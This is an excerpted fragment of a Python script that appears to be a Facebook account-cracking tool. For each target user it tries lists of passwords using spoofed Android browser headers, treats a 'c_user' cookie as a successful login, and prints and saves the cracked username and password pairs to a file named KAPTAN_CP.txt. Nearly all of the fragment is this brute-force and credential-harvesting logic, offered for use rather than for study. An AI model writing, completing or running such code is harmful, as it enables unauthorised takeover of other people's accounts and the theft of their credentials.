...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36;]"}
...
\033[1;31m\033[1;37m Connect\x1b[1;97m  : \033[1;37m          \033[0;96m03435908xxx
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[YSN] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "accept":"text/html, application/xhtml +xnl, application/xml ; g=0.9, image/avif, image /webp, inage/apng , */*; q=0.8, applican/signed-exchange; v=b3;q=0.9",
                    "dnt":"1",
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html, application/xhtml +xnl, application/xml ; g=0.9, image/avif, image /webp, inage/apng , */*; q=0.8, applican/signed-exchange; v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [KAPTAN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KAPTAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
